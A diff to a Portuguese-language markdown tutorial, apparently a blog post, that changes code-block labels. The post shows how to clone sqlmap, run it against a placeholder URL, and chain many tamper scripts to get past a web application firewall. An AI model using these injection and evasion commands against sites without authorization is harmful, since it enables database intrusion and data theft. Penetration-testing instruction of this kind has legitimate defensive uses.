@@ -14,13 +14,13 @@ toc: true
 
 ## 1. Baixando o sqlmap:
 
-```sql
+```bash
 git clone https://github.com/sqlmapproject/sqlmap
 ```
 
 ## 2. Execute a ferramenta para avaliar a segurança do alvo específico:
 
-```sql
+```bash
 sqlmap.py --url="www.site.com/id.php?=1" --tamper=base64encode
 ```
 
@@ -28,7 +28,7 @@ sqlmap.py --url="www.site.com/id.php?=1" --tamper=base64encode
 
 ## 3. Quando se deparar com um Firewall mais sofisticado, será necessário empregar uma combinação de métodos de evasão:
 
-```sql
+```bash
 sqlmap.py --url="www.site.com/id.php?=1" --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
 ```
 
